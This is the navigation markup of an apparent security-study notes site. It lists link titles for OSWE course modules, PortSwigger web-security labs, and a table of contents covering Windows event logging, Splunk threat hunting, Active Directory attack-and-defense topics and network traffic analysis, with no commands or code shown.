            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            OSWE
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Checklist/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OSWE learning process
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2" >
        
          
          <label class="md-nav__link" for="__nav_6_2" id="__nav_6_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Challenge Labs
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_2">
            <span class="md-nav__icon md-icon"></span>
            Challenge Labs
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Challenge%20Labs/ATutor/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ATutor
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Challenge%20Labs/Answer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Answer
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Challenge%20Labs/Chat/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Chat
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Challenge%20Labs/Erka/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Erka
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Challenge%20Labs/Gallery/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Gallery
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Challenge%20Labs/Notebook/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Notebook
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Challenge%20Labs/POC%20script%20requirement/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    POC script requirement
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_3" >
        
          
          <label class="md-nav__link" for="__nav_6_3" id="__nav_6_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Course
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_3">
            <span class="md-nav__icon md-icon"></span>
            Course
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Course/10-Guacamole%20Lite%20Prototype%20Pollution/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    10. Guacamole Lite Prototype Pollution
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Course/11-Dolibarr%20Eval%20Filter%20Bypass%20RCE/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    11. Dolibarr Eval Filter Bypass RCE
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Course/12-RudderStack%20SQLi%20and%20Coraza%20WAF%20Bypass/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    12. RudderStack SQLi and Coraza WAF Bypass
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Course/3-ManageEngine%20Applications%20Manager%20AMUserResourcesSyncServlet%20SQL%20Injection%20RCE/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    3. ManageEngine Applications Manager AMUserResourcesSyncServlet SQL Injection RCE
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Course/4-DotNetNuke%20Cookie%20Deserialization%20RCE/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    4. DotNetNuke Cookie Deserialization RCE
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Course/5-ERPNext%20Authentication%20Bypass%20and%20Server%20Side%20Template%20Injection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    5. ERPNext Authentication Bypass and Server Side Template Injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Course/6-openCRX%20Authentication%20Bypass%20and%20Remote%20Code%20Execution/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    6. openCRX Authentication Bypass and Remote Code Execution
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Course/7-openITCOCKPIT%20XSS%20and%20OS%20Command%20Injection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    7. openITCOCKPIT XSS and OS Command Injection - Blackbox
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Course/8-Concord%20Authentication%20Bypass%20to%20RCE/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    8. Concord Authentication Bypass to RCE
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Course/9-Server-Side%20Request%20Forgery/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    9. Server-Side Request Forgery
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Course/CodeAnalysis/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Source code analysis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Course/DotNet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    .Net
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Course/Java/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Java
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Course/Python/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Python
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_4" >
        
          
          <label class="md-nav__link" for="__nav_6_4" id="__nav_6_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Post course
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_4">
            <span class="md-nav__icon md-icon"></span>
            Post course
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Post-course/BasicCommands/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Some Basic Commands
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Post-course/Deserialization%20vul/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Why deserialization vulnerability exists?
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Post-course/Exploiting%20Jsonpickle%20to%20Get%20RCE/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Research: Exploiting Jsonpickle to Get RCE
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_5" >
        
          
          <label class="md-nav__link" for="__nav_6_5" id="__nav_6_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Pre request
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_5">
            <span class="md-nav__icon md-icon"></span>
            Pre request
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Pre-request/Docker%20commands/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Common commands of Docker
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Pre-request/RegEx/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Regular Expression
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Pre-request/RestTimezone/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Reset Timezone
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Pre-request/apache2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    apache2
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Pre-request/php/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    PHP relevant
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_6" >
        
          
          <label class="md-nav__link" for="__nav_6_6" id="__nav_6_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Tips
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6_6">
            <span class="md-nav__icon md-icon"></span>
            Tips
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Tips/FileTransfer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    File transfer
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Tips/MySQL/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    MySQL
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OSWE/Tips/PostgreSQL/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    PostgreSQL
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
      
      
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
        
          
          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
            
  
  <span class="md-ellipsis">
    OffSec playground
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            OffSec playground
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OffSec%20playground/CVE-2024-25180/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CVE-2024-25180
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OffSec%20playground/Hepet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hepet
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../OffSec%20playground/OSCPExamTips/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OSCPExamTips
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
      
      
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
        
          
          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Others
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8">
            <span class="md-nav__icon md-icon"></span>
            Others
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Others/Bastion/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Ministry of Magic
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Others/Job/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Job
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Others/NZISM%26PSR/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NZISM & PSR
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Others/Use%20WSL%20to%20Install%20Ubuntu%20on%20Windows%2011/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Use WSL to Install Ubuntu on Windows 11
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
      
      
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
        
          
          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="">
            
  
  <span class="md-ellipsis">
    PortSwigger Labs
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_9">
            <span class="md-nav__icon md-icon"></span>
            PortSwigger Labs
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PortSwigger%20Labs/Access%20control%20vulnerabilities/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Access control vulnerabilities
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PortSwigger%20Labs/Authentication/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Authentication
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PortSwigger%20Labs/CORS/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cross-origin resource sharing (CORS)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PortSwigger%20Labs/CSRF/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cross-site request forgery (CSRF)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PortSwigger%20Labs/Clickjacking/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Click jacking
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PortSwigger%20Labs/File%20upload%20vulnerabilities/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    File upload vulnerabilities
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PortSwigger%20Labs/GraphQL%20API%20vulnerabilities/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    GraphQL API vulnerabilities
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PortSwigger%20Labs/HTTP%20Host%20header%20attacks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTTP Host header attacks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PortSwigger%20Labs/Information%20disclosure/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Information disclosure
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PortSwigger%20Labs/Insecure%20deserialization/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Insecure deserialization
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PortSwigger%20Labs/JWT/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    JWT (Json Web Tokens)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PortSwigger%20Labs/NoSQL%20injection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NoSQL injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PortSwigger%20Labs/OAuth%20authentication/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OAuth authentication
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PortSwigger%20Labs/OS%20command%20injection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OS command injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PortSwigger%20Labs/Path%20traversal/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Path traversal
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PortSwigger%20Labs/Race%20conditions/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Race conditions
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PortSwigger%20Labs/SQL%20injection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SQL injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PortSwigger%20Labs/SSRF/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Server-side request forgery (SSRF)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PortSwigger%20Labs/Web%20LLM%20attacks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Web LLM (Large Language Model) attacks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PortSwigger%20Labs/Web%20cache%20poisoning/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Web cache poisoning
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PortSwigger%20Labs/WebSockets/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    WebSockets
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PortSwigger%20Labs/XSS/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cross-site script (XSS)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PortSwigger%20Labs/XXE%20injection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    XML external entity (XXE) injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../PortSwigger%20Labs/server-side%20template%20injection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Sever-side template injection
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#useful-windows-event-logs" class="md-nav__link">
    <span class="md-ellipsis">
      Useful Windows Event Logs
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Useful Windows Event Logs">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-windows-system-logs" class="md-nav__link">
    <span class="md-ellipsis">
      1. Windows System Logs
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-windows-security-logs" class="md-nav__link">
    <span class="md-ellipsis">
      2. Windows Security Logs
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-event-logging-basics-exercises" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Event Logging Basics exercises
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Windows Event Logging Basics exercises">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#skill-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      Skill assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hunting-for-stuxbot" class="md-nav__link">
    <span class="md-ellipsis">
      Hunting For Stuxbot
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Hunting For Stuxbot">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#hunting-for-stuxbot-round-2" class="md-nav__link">
    <span class="md-ellipsis">
      Hunting For Stuxbot (Round 2)
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#understanding-log-sources-investigating-with-splunk" class="md-nav__link">
    <span class="md-ellipsis">
      Understanding Log Sources &amp; Investigating with Splunk
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Understanding Log Sources & Investigating with Splunk">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#spl" class="md-nav__link">
    <span class="md-ellipsis">
      SPL
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#introduction-to-splunk-spl" class="md-nav__link">
    <span class="md-ellipsis">
      Introduction To Splunk &amp; SPL
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-splunk-applications" class="md-nav__link">
    <span class="md-ellipsis">
      Using Splunk Applications
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#intrusion-detection-with-splunk-real-world-scenario" class="md-nav__link">
    <span class="md-ellipsis">
      Intrusion Detection With Splunk (Real-world Scenario)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-attacker-behavior-with-splunk-based-on-ttps" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Attacker Behavior With Splunk Based On TTPs
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#detecting-attacker-behavior-with-splunk-based-on-analytics" class="md-nav__link">
    <span class="md-ellipsis">
      Detecting Attacker Behavior With Splunk Based On Analytics
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#skills-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      Skills Assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#windows-attacks-defense" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Attacks &amp; Defense
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Windows Attacks & Defense">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#kerberoasting" class="md-nav__link">
    <span class="md-ellipsis">
      Kerberoasting
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#as-reproasting" class="md-nav__link">
    <span class="md-ellipsis">
      AS-REProasting
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#gpp-passwords-group-policy-preferences" class="md-nav__link">
    <span class="md-ellipsis">
      GPP Passwords (Group Policy Preferences)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#gpo-permissionsgpo-files" class="md-nav__link">
    <span class="md-ellipsis">
      GPO Permissions/GPO Files
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#credentials-in-shares" class="md-nav__link">
    <span class="md-ellipsis">
      Credentials in Shares
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#credentials-in-object-properties" class="md-nav__link">
    <span class="md-ellipsis">
      Credentials in Object Properties
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dcsync" class="md-nav__link">
    <span class="md-ellipsis">
      DCSync
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#golden-ticket" class="md-nav__link">
    <span class="md-ellipsis">
      Golden Ticket
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#kerberos-constrained-delegation" class="md-nav__link">
    <span class="md-ellipsis">
      Kerberos Constrained Delegation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#print-spooler-ntlm-relaying" class="md-nav__link">
    <span class="md-ellipsis">
      Print Spooler &amp; NTLM Relaying
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#coercing-attacks-unconstrained-delegation" class="md-nav__link">
    <span class="md-ellipsis">
      Coercing Attacks &amp; Unconstrained Delegation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#object-acls" class="md-nav__link">
    <span class="md-ellipsis">
      Object ACLs
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pki-esc1" class="md-nav__link">
    <span class="md-ellipsis">
      PKI - ESC1
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#intro-to-network-traffic-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      Intro to Network Traffic Analysis
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Intro to Network Traffic Analysis">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#tcpdump-fundamentals" class="md-nav__link">
    <span class="md-ellipsis">
      Tcpdump Fundamentals
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tcpdump-packet-filtering" class="md-nav__link">
    <span class="md-ellipsis">
      Tcpdump Packet Filtering
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#wireshark" class="md-nav__link">
    <span class="md-ellipsis">
      Wireshark
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#intermediate-network-traffic-analysis" class="md-nav__link">
    <span class="md-ellipsis">
      Intermediate Network Traffic Analysis
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Intermediate Network Traffic Analysis">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#arp-spoofing-abnormality-detection" class="md-nav__link">
    <span class="md-ellipsis">
      ARP Spoofing &amp; Abnormality Detection
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#arp-scanning-denial-of-service" class="md-nav__link">
    <span class="md-ellipsis">
      ARP Scanning &amp; Denial-of-Service
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#80211-denial-of-service" class="md-nav__link">
    <span class="md-ellipsis">
      802.11 Denial of Service
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rogue-access-point-evil-twin-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Rogue Access Point &amp; Evil-Twin Attacks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#fragmentation-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      Fragmentation Attacks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tcp-handshake-abnormalities" class="md-nav__link">
    <span class="md-ellipsis">
      TCP Handshake Abnormalities
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#httphttps-service-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      HTTP/HTTPs Service Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#strange-http-headers" class="md-nav__link">
    <span class="md-ellipsis">
      Strange HTTP Headers
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
